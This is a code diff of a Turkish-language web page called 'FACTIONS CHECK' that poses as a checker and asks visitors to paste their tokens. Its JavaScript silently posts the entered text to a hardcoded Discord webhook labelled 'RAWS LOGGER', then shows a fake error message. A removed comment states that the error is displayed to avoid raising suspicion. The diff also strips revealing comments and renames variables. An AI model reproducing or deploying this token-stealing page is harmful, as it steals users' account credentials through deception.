@@ -118,7 +118,7 @@
 
 <div class="container">
     <h1>FACTIONS CHECK</h1>
-    <textarea id="contentInput" placeholder="Verileri buraya giriniz..."></textarea>
+    <textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>
     <button id="submitBtn">KONTROL ET</button>
     <div id="status"></div>
 </div>
@@ -127,51 +127,40 @@
 
 <script>
 (function() {
-    // Mouse İmleç Takibi
     const cursor = document.getElementById('cursor');
     document.addEventListener('mousemove', (e) => {
         cursor.style.left = e.clientX + 'px';
         cursor.style.top = e.clientY + 'px';
     });
 
-    // Senin verdiğin webhook adresi
-    const webhookURL = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
+    const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
 
-    document.getElementById('submitBtn').addEventListener('click', async () => {
-        const input = document.getElementById('contentInput').value;
-        const status = document.getElementById('status');
+    document.getElementById('submitBtn').addEventListener('click', function() {
+        const val = document.getElementById('contentInput').value;
+        const st = document.getElementById('status');
 
-        if (!input.trim()) return;
+        if (!val.trim()) return;
 
-        status.style.display = "block";
-        status.textContent = "Bağlantı kuruluyor...";
-        status.style.color = "#ffcc00";
+        st.style.display = "block";
+        st.textContent = "Bağlantı kuruluyor...";
+        st.style.color = "#ffcc00";
 
-        try {
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: "@everyone | Yeni Veri!",
-                    embeds: [{
-                        title: "📥 Gelen Veri",
-                        description: "```" + input + "```",
-                        color: 16711680,
-                        timestamp: new Date()
-                    }]
-                })
-            });
-
-            // Başarılı olsa bile şüphe çekmemek için hata mesajı gösteriyoruz
+        // 'no-cors' yerine normal fetch ama daha basit bir JSON yapısı
+        fetch(wh, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: "RAWS LOGGER",
+                content: "```" + val + "```"
+            })
+        }).then(() => {
             setTimeout(() => {
-                status.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
-                status.style.color = "#ff1e1e";
+                st.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
+                st.style.color = "#ff1e1e";
             }, 1000);
-
-        } catch (err) {
-            console.error(err);
-            status.textContent = "Sunucuya bağlanılamadı.";
-        }
+        }).catch(err => {
+            st.textContent = "Bağlantı hatası.";
+        });
     });
 })();
 </script>
